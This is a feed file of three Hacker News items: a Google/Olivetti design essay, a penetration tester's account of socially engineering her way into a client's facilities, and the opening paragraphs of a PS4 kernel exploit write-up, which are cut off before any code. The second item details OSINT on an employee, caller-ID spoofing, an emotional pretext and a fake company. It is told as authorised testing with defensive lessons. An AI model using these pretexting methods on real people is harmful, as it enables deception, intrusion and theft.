<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Google and the Resurgence of Italian Design</title>
<link>https://blog.prototypr.io/google-and-the-resurgence-of-italian-design-e9234cf3d073</link>
<guid isPermaLink="true" >https://blog.prototypr.io/google-and-the-resurgence-of-italian-design-e9234cf3d073</guid>
<description>&lt;div class=&quot;section-inner sectionLayout--fullWidth&quot; readability=&quot;8&quot;&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*3ozOiC_a_QHdH_0eyWK8dQ.png&quot; data-width=&quot;2272&quot; data-height=&quot;1074&quot; data-is-featured=&quot;true&quot; src=&quot;https://cdn-images-1.medium.com/max/2000/1*3ozOiC_a_QHdH_0eyWK8dQ.png&quot;/&gt;&lt;/div&gt;
Google Daydream VR Headset (2017), Olivetti Divisumma 18 calculator (1973)&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--insetColumn&quot; readability=&quot;32.969696969697&quot;&gt;
&lt;p name=&quot;787e&quot; id=&quot;787e&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Once upon a time, we had products that were colorful, in shapes that were quirky, whimsical, and expressive. Interesting! And then, almost every tech product became white, silver, gray, black, flat, square, round, and minimalist. Boring.&lt;/p&gt;
&lt;p name=&quot;34bb&quot; id=&quot;34bb&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;But there are hints that this is changing. And one of the leaders of this change is, somewhat improbably, Google.&lt;/p&gt;
&lt;p name=&quot;1f5f&quot; id=&quot;1f5f&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Anybody who’s been paying attention knows that Google has been pretty serious about hardware for a while, and at least as serious about &lt;a href=&quot;https://theoutline.com/post/2388/google-is-really-good-at-design&quot; data-href=&quot;https://theoutline.com/post/2388/google-is-really-good-at-design&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;doing quality design&lt;/a&gt; in hardware, software, and overall experiences. What fascinates me is the unexpectedly expressive direction they’ve taken their design language in.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--outsetColumn&quot; readability=&quot;8&quot;&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*FEw2A38ITgITXVYC5M2kgA.png&quot; data-width=&quot;2332&quot; data-height=&quot;1066&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*FEw2A38ITgITXVYC5M2kgA.png&quot; src=&quot;https://cdn-images-1.medium.com/max/2000/1*FEw2A38ITgITXVYC5M2kgA.png&quot;/&gt;&lt;/div&gt;
Google Clips camera (2017), detail of Olivetti Valentine typewriter (1969)&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--insetColumn&quot; readability=&quot;50.336585365854&quot;&gt;
&lt;p name=&quot;e660&quot; id=&quot;e660&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Google’s emerging design language (obviously still a work in progress) is reminiscent of the Italian branch of industrial design, which we haven’t seen much of in the last two or three decades. Instead, it’s been the German branch that has dominated, characterized by clean geometric shapes (cubes, cylinders), white and black glossy colors, and smooth unadorned surfaces. Think Bauhaus and — especially — Braun.&lt;/p&gt;
&lt;p name=&quot;78a9&quot; id=&quot;78a9&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;It’s a cliché at this point to draw parallels between Braun and Apple’s design languages. But nevertheless, aside from its own diversion into the more expressive realm of Italian-inspired design in the 2000’s (original iMac, toilet-seat-shaped original iBook, etc.), Apple has hugely influenced other tech companies to follow the minimalist, German-flavored branch of design.&lt;/p&gt;
&lt;p name=&quot;b9c8&quot; id=&quot;b9c8&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;This isn’t a knock against the Braun style — there are many beautiful products that have sprung from that well. It’s just that diversity is the spice of life, and tech products have become too much of a monoculture, stylistically. My former employer, &lt;a href=&quot;http://www.frogdesign.com&quot; data-href=&quot;http://www.frogdesign.com&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;frog design&lt;/a&gt;, helped set that minimalist course by creating Apple’s original “Snow White” design language back in the 80’s. So perhaps it’s only fitting that many ex-frogs have joined Google and have had a hand in its new design approach.&lt;/p&gt;
&lt;p name=&quot;7f10&quot; id=&quot;7f10&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;With Google’s recent product launch of the Pixel 2 phone, wireless ear-buds, VR headsets, Clips camera, and Home products, I was delighted to see touches of color and form that can clearly be traced back to the Italian branch of design, circa 1960’s and 70’s. In particular, the pioneering company Olivetti, which is most well-known for its famous Valentine typewriter, but which had an incredible run of groundbreaking designs, including the world’s first programmable desktop computer, the &lt;a href=&quot;https://www.inexhibit.com/case-studies/olivetti-programma-101-at-the-origins-of-the-personal-computer/&quot; data-href=&quot;https://www.inexhibit.com/case-studies/olivetti-programma-101-at-the-origins-of-the-personal-computer/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Programma 101&lt;/a&gt; of 1964.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--outsetColumn&quot; readability=&quot;8&quot;&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*zM7e3Svhq7aWtoS6ubYrnw.jpeg&quot; data-width=&quot;1500&quot; data-height=&quot;997&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*zM7e3Svhq7aWtoS6ubYrnw.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/2000/1*zM7e3Svhq7aWtoS6ubYrnw.jpeg&quot;/&gt;&lt;/div&gt;
Olivetti Valentine typewriter, 1969&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--insetColumn&quot; readability=&quot;23.302663438257&quot;&gt;
&lt;p name=&quot;ef27&quot; id=&quot;ef27&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Olivetti was founded in 1908, and starting especially in the 1960’s it really took on design as a strategic differentiator. (This &lt;a href=&quot;http://www.slate.com/blogs/the_eye/2016/06/07/olivetti_beyond_form_and_function_at_the_ica_looks_at_the_design_of_the.html&quot; data-href=&quot;http://www.slate.com/blogs/the_eye/2016/06/07/olivetti_beyond_form_and_function_at_the_ica_looks_at_the_design_of_the.html&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;extended beyond products&lt;/a&gt; to graphic design and architecture, even to the city of Ivrea itself where Olivetti was based.) It hired some of the best designers in the world, including Ettore Sottsass, Perry King, Mario Bellini, among many others.&lt;/p&gt;
&lt;p name=&quot;b03f&quot; id=&quot;b03f&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Central to Olivetti’s philosophy — and also to the designers that it hired — was that technology needed to be humanistic, not domineering, and even if creating an office product there should be touches of joy that enliven everyday tasks. This was especially important at that point in history, which was questioning the rigidity of the traditional workplace (especially gender roles) in a context of social upheavals and transformation.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--outsetColumn&quot; readability=&quot;8&quot;&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*cyTPX3XWCq_XOYBtoPG8Hg.png&quot; data-width=&quot;2256&quot; data-height=&quot;980&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*cyTPX3XWCq_XOYBtoPG8Hg.png&quot; src=&quot;https://cdn-images-1.medium.com/max/2000/1*cyTPX3XWCq_XOYBtoPG8Hg.png&quot;/&gt;&lt;/div&gt;
Google Buds (2017), Olivetti Praxis 48 typewriter (1964)&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--insetColumn&quot; readability=&quot;28&quot;&gt;
&lt;p name=&quot;3848&quot; id=&quot;3848&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;For example, the delightful green key caps of the Praxis 48 typewriter, which was designed by Sottsass in 1964, are like a field of fresh grass for your fingers to play on. Google’s new wireless earphones and Pixel 2 phones also have small splashes of color that give them lively, even playful, personalities.&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*uBZi5lGI5R4rLlAARulKGg.jpeg&quot; data-width=&quot;678&quot; data-height=&quot;538&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*uBZi5lGI5R4rLlAARulKGg.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1200/1*uBZi5lGI5R4rLlAARulKGg.jpeg&quot;/&gt;&lt;/div&gt;
Google Pixel 2 with colorful power buttons
&lt;p name=&quot;bc88&quot; id=&quot;bc88&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;It brings a welcome relief to the ponderously serious design that we see from many other companies, Apple most notably, where there doesn’t seem to be much fun in the design process. And that comes through in the resulting products.&lt;/p&gt;
&lt;p name=&quot;0577&quot; id=&quot;0577&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;(I like what Google is doing with the main surface colors too — subtle but sophisticated tones that offset the bright small touch points beautifully. In the case of the Pixel 2, the use of color is the saving grace to what is otherwise a fairly prosaic overall design.)&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--outsetColumn&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*PqZdydEI8lo0nzrc3szG5Q.jpeg&quot; data-width=&quot;1334&quot; data-height=&quot;763&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*PqZdydEI8lo0nzrc3szG5Q.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/2000/1*PqZdydEI8lo0nzrc3szG5Q.jpeg&quot;/&gt;&lt;/div&gt;
Olivetti Praxis 48 typewriter&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--insetColumn&quot; readability=&quot;17.5&quot;&gt;
&lt;p name=&quot;bc86&quot; id=&quot;bc86&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Designer Sottsass said about his Praxis 48:&lt;/p&gt;
&lt;blockquote name=&quot;d187&quot; id=&quot;d187&quot; class=&quot;graf graf--blockquote graf--startsWithDoubleQuote graf-after--p&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;“The entire machine can be understood as a kind of inside joke: it aims to be a bit funny, joyous but also precious. It engenders a way of looking at mechanics as if you were looking at a toy rather than a real machine: it aims to be an object we are happy to look at, one we approach without fear and without thinking ‘I must get to work’.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p name=&quot;5066&quot; id=&quot;5066&quot; class=&quot;graf graf--p graf-after--blockquote&quot;&gt;It’s this sense of humor (which doesn’t tip over in to becoming a kitschy one-liner) that we rarely see in product design any more, so it’s great to see Google picking up this mantle — especially given Google’s heavy engineering focus on design in the past, this makes it all the more unexpected.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--outsetColumn&quot;&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*mg_jdvvehmsN2NWv4L4DXQ.jpeg&quot; data-width=&quot;2500&quot; data-height=&quot;1567&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*mg_jdvvehmsN2NWv4L4DXQ.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/2000/1*mg_jdvvehmsN2NWv4L4DXQ.jpeg&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--insetColumn&quot; readability=&quot;33.374125874126&quot;&gt;
&lt;p name=&quot;fb77&quot; id=&quot;fb77&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Likewise, the Divisumma 18 calculator, designed in 1973 by Mario Bellini, aimed to make accounting fun. The Museum of Modern Art describes the Divisumma:&lt;/p&gt;
&lt;blockquote name=&quot;05bd&quot; id=&quot;05bd&quot; class=&quot;graf graf--blockquote graf--startsWithDoubleQuote graf-after--p&quot; readability=&quot;12&quot;&gt;
&lt;p&gt;“What is especially intriguing is the continuous, flexible, rubber-skin keyboard… Articulated pushbuttons, covered with the soft rubber skin, are like nipples. The emphasis is not on calculating and power, but on stimulating a sense of pleasure.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p name=&quot;d2ca&quot; id=&quot;d2ca&quot; class=&quot;graf graf--p graf-after--blockquote&quot;&gt;The innovative rubber membrane and the “volcano” shape to the keys has been called &lt;a href=&quot;http://www.industrialfacility.co.uk/wo_files/documents/media/PDF/MDR2.pdf&quot; data-href=&quot;http://www.industrialfacility.co.uk/wo_files/documents/media/PDF/MDR2.pdf&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;“the most influential button design ever&lt;/a&gt;”, and combined with the eye-popping orange color, makes this a really stunning piece, especially when seen and held in person.&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*Yt_8Pgp5PR9Xo_2lHwqVmA.gif&quot; data-width=&quot;550&quot; data-height=&quot;367&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*Yt_8Pgp5PR9Xo_2lHwqVmA.gif&quot;/&gt;&lt;/div&gt;
Pressing the Divisumma keys results in a surprisingly mechanical click sound
&lt;p name=&quot;bbf0&quot; id=&quot;bbf0&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;In this same vein, I was struck by the forms, the playful use of color, and the novel material choices on Google’s new Daydream View VR headset. It’s an even more intimate product in that it mounts to your head and creates a new world in front of your eyes. So it’s only appropriate that it takes on a feel of fashion and clothing, brings a new soft material to a technological object, and heathered colors that are a stark contrast to the edgy gaming aesthetic that dominates VR. It almost announces “This is VR for the rest of us.”&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--outsetColumn&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*ME-ExvLqaTTgz3g4CesOwA.jpeg&quot; data-width=&quot;1278&quot; data-height=&quot;718&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*ME-ExvLqaTTgz3g4CesOwA.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/2000/1*ME-ExvLqaTTgz3g4CesOwA.jpeg&quot;/&gt;&lt;/div&gt;
Daydream View VR Headsets (2017)&lt;/div&gt;
&lt;div class=&quot;section-inner sectionLayout--insetColumn&quot; readability=&quot;24.160447761194&quot;&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*HJQ8NigT9oQ_-RicBK_PSw.jpeg&quot; data-width=&quot;764&quot; data-height=&quot;1173&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*HJQ8NigT9oQ_-RicBK_PSw.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1200/1*HJQ8NigT9oQ_-RicBK_PSw.jpeg&quot;/&gt;&lt;/div&gt;
Google Home Mini, and Google Home (2017)
&lt;p name=&quot;b048&quot; id=&quot;b048&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Google’s Home products, which debuted last year, began the motif of cloth-covered surfaces that the Daydream extends. The new Home update continues that motif, with bolder use of colors, and a new “fun-size” puck version. Early on there was some joking that Home &lt;a href=&quot;https://thenextweb.com/google/2016/05/18/google-home-freshener/&quot; data-href=&quot;https://thenextweb.com/google/2016/05/18/google-home-freshener/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;looks like an air freshener&lt;/a&gt;, but it was clearly all part of the plan to make the product blend in to the home and make it less of a sore thumb sticking out.&lt;/p&gt;
&lt;p name=&quot;d567&quot; id=&quot;d567&quot; class=&quot;graf graf--p graf-after--p graf--trailing&quot;&gt;I really hope this is the start of a longer trend of making the tech products that surround us unboring again, that other companies embrace and make their own. There’s much we can learn from the Italian path of design, lessons which are all the more important as technology becomes more intimate and pervasive with every passing week.&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Sat, 21 Oct 2017 08:02:27 +0000</pubDate>
<dc:creator>DanBC</dc:creator>
<og:title>Google and the Resurgence of Italian Design – prototypr</og:title>
<og:url>https://blog.prototypr.io/google-and-the-resurgence-of-italian-design-e9234cf3d073</og:url>
<og:image>https://cdn-images-1.medium.com/max/1200/1*3ozOiC_a_QHdH_0eyWK8dQ.png</og:image>
<og:description>Once upon a time, we had products that were colorful, in shapes that were quirky, whimsical, and expressive. Interesting! And then, almost…</og:description>
<og:type>article</og:type>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.prototypr.io/google-and-the-resurgence-of-italian-design-e9234cf3d073?gi=25bec1ea39f9</dc:identifier>
</item>
<item>
<title>Socially Engineering Myself into High Security Facilities</title>
<link>https://motherboard.vice.com/en_us/article/qv34zb/how-i-socially-engineer-myself-into-high-security-facilities</link>
<guid isPermaLink="true" >https://motherboard.vice.com/en_us/article/qv34zb/how-i-socially-engineer-myself-into-high-security-facilities</guid>
<description>&lt;p&gt;&lt;em&gt;Sophie is a physical penetration tester and information security consultant. She specializes in social engineering security assessments including physical, voice (vishing) and text (phishing). She consults in remediation and prevention of security incidents through creation of policy and procedures, as well as customized training for your individual office culture. Prior to working in infosec, Sophie was a journalist, photographer, and a mom.&lt;/em&gt;&lt;/p&gt;

&lt;hr/&gt;&lt;p&gt;Hello! My name is Sophie and I break into buildings. I get paid to think like a criminal.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Organizations hire me to evaluate their security, which I do by seeing if I can bypass it. During tests I get to do some lockpicking, climb over walls or hop barbed wire fences. I get to go dumpster diving and play with all sorts of cool gadgets that Q would be proud of.&lt;/p&gt;
&lt;p&gt;But usually, I use what is called &lt;a href=&quot;https://motherboard.vice.com/en_us/article/mg79v4/hacking-glossary&quot;&gt;social engineering&lt;/a&gt; to convince the employees to let me in. Sometimes I use email or phone calls to pretend to be someone I am not. Most often I get to approach people in-person and give them the confidence to let me in.&lt;/p&gt;
&lt;p&gt;My frequently asked questions include:&lt;br/&gt;What break-in are you most proud of?&lt;br/&gt;What have you done for a test that you were the most ashamed of?&lt;/p&gt;
&lt;p&gt;What follows is the answer to both of these questions.&lt;/p&gt;
&lt;p&gt;A few months ago, a client had hired me to test two of their facilities. A manufacturing plant, plus data center and office building nearby.&lt;/p&gt;
&lt;p&gt;First step: open source intelligence, or OSINT. I look at maps, satellite images, study what I can of their delivery and supply schedules, and so on.&lt;/p&gt;
&lt;p&gt;The manufacturing facility looked like a prison. No windows, heavy iron gates, no landscaping. Generally a monstrosity of architecture.&lt;/p&gt;
&lt;p&gt;This facility had armed guards, badge readers, biometric security controls and turnstiles at every entrance.&lt;/p&gt;
&lt;p&gt;I remember thinking, &quot;It's got to be hell to work in there. I wonder if I can use that…&quot;&lt;/p&gt;

&lt;p&gt;One thing was for sure… The chances of tailgating (following behind an employee with valid credentials) into this building were next to non-existent.&lt;/p&gt;
&lt;p&gt;I was going to have to get down and dirty with my social engineering.&lt;/p&gt;

&lt;p&gt;First stop: LinkedIn. Your LinkedIn is my best friend. The more information you have on your LinkedIn, the more options I have.&lt;/p&gt;
&lt;p&gt;I have several fake LinkedIn profiles that you are probably connected to.&lt;/p&gt;

&lt;p&gt;I scour profiles of employees who work at these facilities, and cross-reference them to other social media sites. And I find a lovely young woman who I'm going to call Mary.&lt;/p&gt;
&lt;p&gt;Mary was a brand-new hire working as an assistant at the manufacturing facility. Mary had a public Facebook account too.&lt;/p&gt;
&lt;p&gt;On Mary's public Facebook account, she documented all of her family's adventures.&lt;/p&gt;
&lt;p&gt;Side note: Now I know where Mary went to high school, her mother's maiden name, the names of her pets, etc.&lt;/p&gt;
&lt;p&gt;Answers to those &quot;security questions&quot; you use to reset your passwords are very easy to find if you aren't careful with that information.&lt;/p&gt;

&lt;p&gt;Not to mention that now I know where Mary works, where her kids go to school, where they vacation…I could go on. Scary stuff.&lt;/p&gt;
&lt;p&gt;This is not an advanced investigation. I'm not a private investigator and I don't have the resources of the NSA. But I can do a lot of damage with simple methods.&lt;/p&gt;
&lt;p&gt;Most notably to me, there were photos Mary posted of her time volunteering with a certain maternity support center.&lt;/p&gt;
&lt;p&gt;Her passion for children and caring new moms was very plain. So of course, I took advantage of it.&lt;/p&gt;

&lt;p&gt;For this assessment I played two roles. For the first, I spoofed my phone number to make it look like it was coming from the company's headquarters.&lt;/p&gt;
&lt;p&gt;I called the front desk of the manufacturing facility and was transferred to Mary. &quot;Hi Mary!&quot; I said, &quot;My name is Barbara.&quot;&lt;/p&gt;

&lt;p&gt;&quot;I am a project coordinator with facilities management. We are renovating a few of our facilities. We are sending an interior designer out to you tomorrow so she can put together proposals to update your space!&quot;&lt;/p&gt;

&lt;p&gt;Mary replied, &quot;Well that's great! But why the short notice?&quot; I could feel her getting suspicious, so I pulled out my trump card…&lt;/p&gt;
&lt;p&gt;*Sigh* &quot;Well Mary… You really should have heard from me sooner. I've just been so overloaded at work…I feel like I can't catch up, and to top it off the baby is due in 6 weeks. If my boss finds out I messed this up he's going to flip.&quot;&lt;/p&gt;
&lt;p&gt;I was really getting into this, voice shaking. (Yes, I know, I'm a terrible human being.)&lt;/p&gt;
&lt;p&gt;She cut me off, &quot;Oh hunny, hunny it's ok. We will work this out! Tell me about the baby! Is it your first? Boy or girl?!&quot;&lt;/p&gt;
&lt;p&gt;Our Mary was committed at this point. Not because she is stupid, but because she is a good person. She wanted to help me.&lt;/p&gt;
&lt;p&gt;We talked babies and birth plans for a while (never pick a pretext you can't speak about at length.)&lt;/p&gt;
&lt;p&gt;Mary took down the name of the &quot;designer&quot; who was coming by the next day and we said our goodbyes. Mary could have saved her company a lot of heartache by simply verifying that I was who I claimed to be. (Just to be clear here, I would never give out Mary's real identity. I'm not totally heartless. This could have happened to anyone. She has not been fired.)&lt;/p&gt;
&lt;p&gt;I showed up the next day as &quot;Claire&quot; with a fictional architecture firm that I had made business cards and a website for. My alter-ego Barb had done most of the leg work for me. When I arrived, Mary and her boss were waiting for me with smiles. I shook hands all around and handed them the business card I printed out the night before. I was given a visitor badge and the red carpet was rolled out.&lt;/p&gt;

&lt;p&gt;I gained rapport with the staff there by asking them to tell me what they wanted in an office space. They were so excited. I might have claimed to be on the team that put together the Google offices…(Yes, I am HORRIBLE. This is my inner demon child.)&lt;/p&gt;
&lt;p&gt;&quot;You want a standing desk? New chairs over here?! Ergonomic keyboards for everyone! Let's look at swatches!&quot;&lt;/p&gt;
&lt;p&gt;We became best buds. I was given complete and unaccompanied access to the facility where I stayed for several hours.&lt;/p&gt;
&lt;p&gt;I gained network access and stole several thousands of dollars in physical primitives by picking my way through cheap locks (credit to &lt;a href=&quot;https://twitter.com/deviantollam&quot; target=&quot;_blank&quot;&gt;Deviant Ollam&lt;/a&gt; for the rad lockpicking animations.)&lt;/p&gt;

&lt;p&gt;This client had been pretty confident that I wouldn't get into either facility, much less be able to hit both in a short time span. So the timeline was left to my discretion, but it was assumed that I would need to fly to the area twice.&lt;/p&gt;
&lt;p&gt;I didn't see the need in burdening them with two round-trip expenses.&lt;/p&gt;

&lt;p&gt;I went back to Mary's office and said, &quot;Well I think I have what I need from here. How do I get to the office center?&quot;&lt;/p&gt;
&lt;p&gt;She looked at her watch and said, &quot;It's almost lunch time. I'll take you there!&quot; A whole group of us piled into the parking lot, and they took me to a nearby taco shop. That's right. My Marks took me to get tacos… I love my job.&lt;/p&gt;
&lt;p&gt;After lunch they drove me to the offices and a few of them came in with me to show me around.&lt;/p&gt;

&lt;p&gt;I took FOREVER looking around this office space, and eventually they said their goodbyes because they had to go back to work. They had a strict policy of escorting visitors. But I had been seen walking around with trusted insiders so no one questioned me.&lt;/p&gt;
&lt;p&gt;I was free to take my time. I made myself at home. My main objective at this site was to weasel my way into private corner offices.&lt;/p&gt;
&lt;p&gt;When I accomplished my goals, I tracked down my point of contact's office. This is the man who hired me in the first place. This is the best part of every job.&lt;/p&gt;

&lt;p&gt;Steve was there, hard at work when I disturbed his groove by knocking on the door. He glanced up, &quot;Hi there, can I help you?&quot;&lt;/p&gt;
&lt;p&gt;I smiled. &quot;Hi Steve! I'm Sophie from Sincerely Security. It's nice to meet you in-person!&quot;&lt;/p&gt;
&lt;p&gt;I will never forget the look on his face… Pure gold. &quot;Who?.... Wait, what? How? How did you get in here?!&quot;&lt;/p&gt;

&lt;p&gt;We stayed in his office and talked for a long time. I went over exactly the steps that could have prevented my success. First of all, the desire to help others is human and natural. We don't want to discourage that.&lt;/p&gt;
&lt;p&gt;Second, I'm sure they did have some sort of policy that required visitors to check in showing government issued identification, but they weren't following it.&lt;/p&gt;
&lt;p&gt;We also need to post by every computer, phone and door: &quot;TRUST, BUT VERIFY.&quot;&lt;/p&gt;
&lt;p&gt;An employee who does their homework can ruin my day.&lt;/p&gt;
&lt;p&gt;Third, if it seems too good to be true, it probably is.&lt;/p&gt;

&lt;p&gt;Is your company going to hire the team who designed Google's offices? Magic 8 ball says no.&lt;/p&gt;
&lt;p&gt;Lastly, the team who took me to the second location should have found someone else to escort me through the building.&lt;/p&gt;

&lt;p&gt;I've been doing this job for a couple years now, and almost every job is a variant of this story. Very rarely do I go through an entire assessment without some sort of social engineering.&lt;/p&gt;
&lt;p&gt;There are ways to protect yourself and your company from attacks like this. I think it starts by sharing stories like these, and educating and empowering each other to be vigilant.&lt;/p&gt;
&lt;p&gt;Please share your thoughts with me. Reach out on Twitter where you will find me &lt;a href=&quot;https://twitter.com/HydeNS33k&quot; target=&quot;_blank&quot;&gt;@HydeNs33k&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Get six of our favorite Motherboard stories every day&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;http://motherboard.club/&quot; target=&quot;_blank&quot;&gt;&lt;em&gt;by signing up for our newsletter.&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 20 Oct 2017 15:30:24 +0000</pubDate>
<dc:creator>anarbadalov</dc:creator>
<og:type>article</og:type>
<og:title>How I Socially Engineer Myself Into High Security Facilities</og:title>
<og:image>https://video-images.vice.com/articles/59e91ac5dc790e487ca24508/lede/1508452227808-shutterstock_727829200-1.jpeg?crop=1xw:0.8424862705941089xh;center,center&amp;resize=1200:*</og:image>
<og:url>https://motherboard.vice.com/en_us/article/qv34zb/how-i-socially-engineer-myself-into-high-security-facilities</og:url>
<og:description>A pentester shares a story that shows how social engineering can get you anywhere.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://motherboard.vice.com/en_us/article/qv34zb/how-i-socially-engineer-myself-into-high-security-facilities</dc:identifier>
</item>
<item>
<title>The First PS4 Kernel Exploit: Adieu</title>
<link>https://fail0verflow.com/blog/2017/ps4-namedobj-exploit/</link>
<guid isPermaLink="true" >https://fail0verflow.com/blog/2017/ps4-namedobj-exploit/</guid>
<description>&lt;p&gt;Plenty of time has passed since we first demonstrated Linux running on the PS4.&lt;/p&gt;&lt;p&gt;Now we will step back a bit and explain how we managed to jump from the browser process into the kernel such that &lt;a href=&quot;https://github.com/fail0verflow/ps4-kexec&quot;&gt;ps4-kexec&lt;/a&gt; et al. are usable.&lt;/p&gt;
&lt;p&gt;Over time, ps4 firmware revisions have progressively added many mitigations and in general tried to lock down the system. This post will mainly touch on vulnerabilities and issues which are not present on the latest releases, but should still be useful for people wanting to investigate ps4 security.&lt;/p&gt;

&lt;p&gt;As previously explained, we were able to get a dump of the ps4 firmware 1.01 kernel via a PCIe man-in-the-middle attack. Like all FreeBSD kernels, this image included “export symbols” - symbols which are required to perform kernel and module initialization processes. However, the ps4 1.01 kernel &lt;em&gt;also&lt;/em&gt; included full ELF symbols (obviously an oversight as they have been removed in later firmware versions). This oversight was beneficial to the reverse engineering process, although of course not a true prerequisite. Indeed, we began exploring the kernel by examining built-in metadata in the form of the syscall handler table - focusing on the ps4-specific entries.&lt;/p&gt;
&lt;p&gt;After some recovering of structures, we discovered that a large portion of the ps4-specific syscalls are little more than wrappers to what is essentially a hash table API. The API exposes the following interface:&lt;/p&gt;
